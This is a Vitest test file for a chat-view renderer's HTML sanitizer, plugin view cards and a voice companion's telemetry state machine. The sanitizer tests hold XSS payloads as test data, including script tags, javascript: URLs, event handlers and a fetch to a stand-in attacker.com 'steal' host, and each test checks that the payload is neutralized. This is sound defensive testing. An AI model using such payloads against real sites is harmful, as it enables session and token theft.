import { describe, expect, it } from "vitest";
import {
  computeVoiceRealTimeFactor,
  createVoiceCompanionSession,
  SOVEREIGN_RTF_TARGET,
  transitionVoiceCompanionState,
} from "../../tts/sovereign-voice-companion.js";
import {
  type ChatNativePluginView,
  type ChatViewActionButton,
  renderChatNativeView,
  sanitizeChatViewText,
} from "./chat-view-renderer.js";

describe("sanitizeChatViewText", () => {
  it("handles non-string or empty inputs safely", () => {
    // @ts-expect-error testing runtime resilience against invalid types
    expect(sanitizeChatViewText(undefined)).toBe("");
    // @ts-expect-error testing runtime resilience against invalid types
    expect(sanitizeChatViewText(null)).toBe("");
    // @ts-expect-error testing runtime resilience against invalid types
    expect(sanitizeChatViewText(123)).toBe("");
    expect(sanitizeChatViewText("")).toBe("");
  });

  it("escapes simple <script> and alert payloads", () => {
    const malicious = "<script>alert('xss')</script>";
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("</script>");
    expect(sanitized).toBe("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
  });

  it("escapes script tags with attributes and sources", () => {
    const malicious = '<script src="https://evil.example.com/payload.js"></script>';
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).toBe(
      "&lt;script src=&quot;https://evil.example.com/payload.js&quot;&gt;&lt;/script&gt;",
    );
  });

  it("escapes uppercase and mixed-case script tags", () => {
    const malicious = "<SCRIPT>alert(1)</SCRIPT>";
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).not.toContain("<SCRIPT>");
    expect(sanitized).toBe("&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;");
  });

  it("neutralizes javascript: pseudo-protocols with various whitespace and casing", () => {
    const input1 = '<a href="javascript:alert(1)">Click</a>';
    const input2 = '<a href="JAVASCRIPT :alert(1)">Click</a>';
    const sanitized1 = sanitizeChatViewText(input1);
    const sanitized2 = sanitizeChatViewText(input2);

    expect(sanitized1).toContain("blocked-javascript:alert(1)");
    expect(sanitized2).toContain("blocked-javascript:alert(1)");
    expect(sanitized1).not.toMatch(/(?<!blocked-)javascript\s*:/i);
    expect(sanitized2).not.toMatch(/(?<!blocked-)JAVASCRIPT\s*:/i);
  });

  it("neutralizes vbscript: pseudo-protocols", () => {
    const input = '<a href="vbscript:msgbox(1)">Click</a>';
    const sanitized = sanitizeChatViewText(input);
    expect(sanitized).toContain("blocked-vbscript:msgbox(1)");
  });

  it("neutralizes inline onerror= event handlers", () => {
    const malicious = '<img src="invalid.jpg" onerror="evilPayload()">';
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).toContain("data-blocked-onerror=&quot;evilPayload()&quot;");
    expect(sanitized).not.toContain("<img");
  });

  it("neutralizes inline onload= event handlers", () => {
    const malicious = '<body onload="evilInit()">';
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).toContain("data-blocked-onload=&quot;evilInit()&quot;");
  });

  it("neutralizes various other on* event handlers (onmouseover, onclick, onfocus)", () => {
    const malicious =
      '<button onmouseover="bad1()" onclick="bad2()" onfocus="bad3()">Click</button>';
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).toContain("data-blocked-onmouseover=");
    expect(sanitized).toContain("data-blocked-onclick=");
    expect(sanitized).toContain("data-blocked-onfocus=");
  });

  it("neutralizes nested script tags", () => {
    const malicious = "<script><script>alert('nested')</script></script>";
    const sanitized = sanitizeChatViewText(malicious);
    expect(sanitized).not.toContain("<script>");
    expect(sanitized).toBe(
      "&lt;script&gt;&lt;script&gt;alert(&#39;nested&#39;)&lt;/script&gt;&lt;/script&gt;",
    );
  });

  it("is idempotent when run repeatedly on sanitized input", () => {
    const payload =
      '<img src="x" onerror="evil()" href="javascript:doBad()"><script>alert(1)</script>';
    const pass1 = sanitizeChatViewText(payload);
    const pass2 = sanitizeChatViewText(pass1);
    expect(pass2).toBe(pass1);
  });

  it("preserves safe plain text and numbers", () => {
    const safeText = "Build #42: Passed 100% (latency = 12ms).";
    expect(sanitizeChatViewText(safeText)).toBe(safeText);
  });
});

describe("renderChatNativeView", () => {
  const sampleActions: readonly ChatViewActionButton[] = [
    {
      id: "action-approve",
      label: "Approve PR",
      actionUrlOrCommand: "/pr approve 101",
      style: "primary",
      requiresConfirmation: true,
    },
    {
      id: "action-dismiss",
      label: "Dismiss",
      actionUrlOrCommand: "/pr dismiss 101",
      style: "danger",
    },
  ];

  it("renders a kanban_board view across all surfaces", () => {
    const view: ChatNativePluginView = {
      viewId: "view-kb-1",
      pluginId: "war-room-plugin",
      viewType: "kanban_board",
      title: "War Room Sprint Board",
      subtitle: "Active items for Lane A",
      fields: [
        { label: "Backlog", value: "3 tasks" },
        { label: "In Progress", value: "2 tasks", badge: "ok" },
        { label: "Blocked", value: "1 task", badge: "warn" },
      ],
      actions: sampleActions,
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);

    // 1. Markdown Card
    expect(rendered.markdownCard).toContain("### [War Room Sprint Board]");
    expect(rendered.markdownCard).toContain("_Active items for Lane A_");
    expect(rendered.markdownCard).toContain(
      "**Type:** `kanban_board` | **Plugin:** `war-room-plugin`",
    );
    expect(rendered.markdownCard).toContain("- **Backlog:** 3 tasks");
    expect(rendered.markdownCard).toContain("- **In Progress:** 2 tasks [OK]");
    expect(rendered.markdownCard).toContain("- **Blocked:** 1 task [WARN]");
    expect(rendered.markdownCard).toContain(
      "- [**Approve PR**] (`/pr approve 101`) [primary] ⚠️ _(Confirmation Required)_",
    );
    expect(rendered.markdownCard).toContain("- [**Dismiss**] (`/pr dismiss 101`) [danger]");
    expect(rendered.markdownCard).toContain("_Updated: 2026-02-02T02:40:00.000Z_");

    // 2. Cockpit HTML Snippet
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<div class="coreblow-chat-view coreblow-chat-view-kanban_board"',
    );
    expect(rendered.cockpitHtmlSnippet).toContain('data-view-id="view-kb-1"');
    expect(rendered.cockpitHtmlSnippet).toContain('data-plugin-id="war-room-plugin"');
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<h3 class="coreblow-chat-view-title">War Room Sprint Board</h3>',
    );
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<p class="coreblow-chat-view-subtitle">Active items for Lane A</p>',
    );
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<span class="coreblow-badge coreblow-badge-ok">[OK]</span>',
    );
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<span class="coreblow-badge coreblow-badge-warn">[WARN]</span>',
    );
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<button type="button" class="coreblow-btn coreblow-btn-primary" data-action="/pr approve 101" data-requires-confirmation="true">Approve PR</button>',
    );
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<button type="button" class="coreblow-btn coreblow-btn-danger" data-action="/pr dismiss 101">Dismiss</button>',
    );

    // 3. Structured Blocks
    expect(rendered.structuredBlocks.type).toBe("native_plugin_view");
    expect(rendered.structuredBlocks.viewId).toBe("view-kb-1");
    expect(rendered.structuredBlocks.pluginId).toBe("war-room-plugin");
    expect(rendered.structuredBlocks.viewType).toBe("kanban_board");
    expect(rendered.structuredBlocks.title).toBe("War Room Sprint Board");
    expect(rendered.structuredBlocks.subtitle).toBe("Active items for Lane A");
    expect(rendered.structuredBlocks.fields).toEqual(view.fields);
    expect(rendered.structuredBlocks.actions).toEqual(view.actions);
    expect(rendered.structuredBlocks.updatedAtMs).toBe(1770000000000);
  });

  it("renders a pr_scorecard view with error badges", () => {
    const view: ChatNativePluginView = {
      viewId: "view-pr-99",
      pluginId: "pr-workflow-plugin",
      viewType: "pr_scorecard",
      title: "PR #99 Scorecard",
      fields: [
        { label: "Typecheck", value: "Green", badge: "ok" },
        { label: "Unit Tests", value: "115 passed", badge: "ok" },
        { label: "Security Scan", value: "Secret detected in diff", badge: "error" },
      ],
      actions: [],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);
    expect(rendered.markdownCard).toContain("- **Security Scan:** Secret detected in diff [ERROR]");
    expect(rendered.cockpitHtmlSnippet).toContain(
      '<span class="coreblow-badge coreblow-badge-error">[ERROR]</span>',
    );
    expect(rendered.cockpitHtmlSnippet).not.toContain("coreblow-chat-view-actions");
  });

  it("renders a quota_gauge view with empty actions", () => {
    const view: ChatNativePluginView = {
      viewId: "view-qg-1",
      pluginId: "decision-router-plugin",
      viewType: "quota_gauge",
      title: "Anthropic Quota Window",
      fields: [
        { label: "Used Tokens", value: "450,000 / 500,000" },
        { label: "Window Resets In", value: "42 minutes", badge: "warn" },
      ],
      actions: [],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);
    expect(rendered.markdownCard).toContain("### [Anthropic Quota Window]");
    expect(rendered.markdownCard).not.toContain("**Actions:**");
    expect(rendered.cockpitHtmlSnippet).toContain("coreblow-chat-view-quota_gauge");
  });

  it("renders an approval_prompt view with confirmation buttons", () => {
    const view: ChatNativePluginView = {
      viewId: "view-appr-1",
      pluginId: "security-gate",
      viewType: "approval_prompt",
      title: "Deployment Approval Required",
      subtitle: "Target: Production Gateway",
      fields: [{ label: "Risk Level", value: "Elevated", badge: "warn" }],
      actions: [
        {
          id: "act-1",
          label: "Confirm Deployment",
          actionUrlOrCommand: "/deploy --confirm",
          style: "primary",
          requiresConfirmation: true,
        },
      ],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);
    expect(rendered.markdownCard).toContain("⚠️ _(Confirmation Required)_");
    expect(rendered.cockpitHtmlSnippet).toContain('data-requires-confirmation="true"');
  });

  it("renders a memory_wiki_card view cleanly", () => {
    const view: ChatNativePluginView = {
      viewId: "view-mwc-1",
      pluginId: "cory-knowledge-scribe",
      viewType: "memory_wiki_card",
      title: "Architecture Decisions",
      fields: [{ label: "Topic", value: "Hybrid OOP Microkernel + Pure DOP" }],
      actions: [],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);
    expect(rendered.markdownCard).toContain("### [Architecture Decisions]");
    expect(rendered.structuredBlocks.viewType).toBe("memory_wiki_card");
  });

  it("sanitizes dynamic fields in HTML output to prevent XSS injection", () => {
    const maliciousView: ChatNativePluginView = {
      viewId: 'test-view"><script>evil()</script>',
      pluginId: "exploit-plugin",
      viewType: "kanban_board",
      title: "<script>alert('title-xss')</script>",
      subtitle: '<img src="x" onerror="evilSubtitle()">',
      fields: [
        {
          label: '<b onclick="steal()">Malicious Label</b>',
          value: '<a href="javascript:stealTokens()">Click for prize</a>',
        },
      ],
      actions: [
        {
          id: "evil-act",
          label: '<svg onload="alert(1)">Evil Button</svg>',
          actionUrlOrCommand: 'javascript:fetch("https://attacker.com/steal")',
          style: "danger",
        },
      ],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(maliciousView);

    // Verify HTML snippet contains NO executable script or unneutralized handlers
    expect(rendered.cockpitHtmlSnippet).not.toContain("<script>");
    expect(rendered.cockpitHtmlSnippet).not.toContain("<img");
    expect(rendered.cockpitHtmlSnippet).not.toContain("<svg");
    expect(rendered.cockpitHtmlSnippet).not.toMatch(/(?<!blocked-)javascript\s*:/i);
    expect(rendered.cockpitHtmlSnippet).toContain("blocked-javascript:");
    expect(rendered.cockpitHtmlSnippet).toContain("data-blocked-onerror=");
    expect(rendered.cockpitHtmlSnippet).toContain("data-blocked-onclick=");
    expect(rendered.cockpitHtmlSnippet).toContain("data-blocked-onload=");
    expect(rendered.cockpitHtmlSnippet).toContain(
      "&lt;script&gt;alert(&#39;title-xss&#39;)&lt;/script&gt;",
    );
  });
});

describe("computeVoiceRealTimeFactor", () => {
  it("exposes the sovereign RTF target constant", () => {
    expect(SOVEREIGN_RTF_TARGET).toBe(0.4);
  });

  it("computes RTF correctly when under the 0.40 sovereign target", () => {
    const telemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 1000,
      synthesisLatencyMs: 200,
      utteranceLengthChars: 45,
      backend: "apple-mlx-neural",
    });

    expect(telemetry.rtf).toBe(0.2);
    expect(telemetry.meetsSovereignTarget).toBe(true);
    expect(telemetry.audioDurationMs).toBe(1000);
    expect(telemetry.synthesisLatencyMs).toBe(200);
    expect(telemetry.utteranceLengthChars).toBe(45);
    expect(telemetry.backend).toBe("apple-mlx-neural");
  });

  it("certifies RTF when exactly at the 0.40 boundary", () => {
    const telemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 1000,
      synthesisLatencyMs: 400,
    });

    expect(telemetry.rtf).toBe(0.4);
    expect(telemetry.meetsSovereignTarget).toBe(true);
    expect(telemetry.backend).toBe("apple-mlx-neural");
    expect(telemetry.utteranceLengthChars).toBe(0);
  });

  it("fails certification when RTF exceeds 0.40 target", () => {
    const telemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 1000,
      synthesisLatencyMs: 401,
      backend: "local-onnx",
    });

    expect(telemetry.rtf).toBe(0.401);
    expect(telemetry.meetsSovereignTarget).toBe(false);
    expect(telemetry.backend).toBe("local-onnx");
  });

  it("safely handles audioDurationMs of 0 to prevent division by zero", () => {
    const telemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 0,
      synthesisLatencyMs: 50,
    });

    expect(telemetry.rtf).toBe(50);
    expect(telemetry.meetsSovereignTarget).toBe(false);
  });

  it("safely handles negative synthesis latency", () => {
    const telemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 1000,
      synthesisLatencyMs: -10,
    });

    expect(telemetry.rtf).toBe(0);
    expect(telemetry.meetsSovereignTarget).toBe(true);
  });
});

describe("Voice Companion State Machine", () => {
  it("initializes a companion session in idle state", () => {
    const session = createVoiceCompanionSession({
      sessionId: "session-test-1",
      wakeShortcut: "double_tap_option",
      backend: "apple-mlx-neural",
    });

    expect(session.sessionId).toBe("session-test-1");
    expect(session.state).toBe("idle");
    expect(session.wakeShortcut).toBe("double_tap_option");
    expect(session.activeBackend).toBe("apple-mlx-neural");
    expect(session.consecutiveDegradedCount).toBe(0);
  });

  it("transitions through wake, speech recognition, synthesis, and playback cycle", () => {
    const session0 = createVoiceCompanionSession({ sessionId: "flow-1" });
    expect(session0.state).toBe("idle");

    const session1 = transitionVoiceCompanionState(session0, {
      type: "WAKE_TRIGGERED",
      shortcut: "push_to_talk",
    });
    expect(session1.state).toBe("listening");
    expect(session1.wakeShortcut).toBe("push_to_talk");

    const session2 = transitionVoiceCompanionState(session1, {
      type: "SPEECH_RECOGNIZED",
      text: "Summarize this PR",
    });
    expect(session2.state).toBe("synthesizing");

    const telemetryPass = computeVoiceRealTimeFactor({
      audioDurationMs: 2000,
      synthesisLatencyMs: 500,
    });
    const session3 = transitionVoiceCompanionState(session2, {
      type: "SYNTHESIS_FINISHED",
      telemetry: telemetryPass,
    });
    expect(session3.state).toBe("speaking");
    expect(session3.consecutiveDegradedCount).toBe(0);
    expect(session3.lastTelemetry?.meetsSovereignTarget).toBe(true);

    const session4 = transitionVoiceCompanionState(session3, {
      type: "PLAYBACK_FINISHED",
    });
    expect(session4.state).toBe("idle");
  });

  it("escalates to degraded state and cloud-fallback when RTF fails 3 times consecutively", () => {
    let session = createVoiceCompanionSession({ backend: "apple-mlx-neural" });

    const slowTelemetry = computeVoiceRealTimeFactor({
      audioDurationMs: 1000,
      synthesisLatencyMs: 600, // RTF = 0.6 > 0.4
    });

    // 1st slow synthesis
    session = transitionVoiceCompanionState(session, {
      type: "SYNTHESIS_FINISHED",
      telemetry: slowTelemetry,
    });
    expect(session.consecutiveDegradedCount).toBe(1);
    expect(session.state).toBe("speaking");
    expect(session.activeBackend).toBe("apple-mlx-neural");

    // 2nd slow synthesis
    session = transitionVoiceCompanionState(session, {
      type: "SYNTHESIS_FINISHED",
      telemetry: slowTelemetry,
    });
    expect(session.consecutiveDegradedCount).toBe(2);
    expect(session.state).toBe("speaking");
    expect(session.activeBackend).toBe("apple-mlx-neural");

    // 3rd slow synthesis -> degrades!
    session = transitionVoiceCompanionState(session, {
      type: "SYNTHESIS_FINISHED",
      telemetry: slowTelemetry,
    });
    expect(session.consecutiveDegradedCount).toBe(3);
    expect(session.state).toBe("degraded");
    expect(session.activeBackend).toBe("cloud-fallback");

    // Reset recovers to idle
    session = transitionVoiceCompanionState(session, { type: "RESET" });
    expect(session.state).toBe("idle");
  });
});
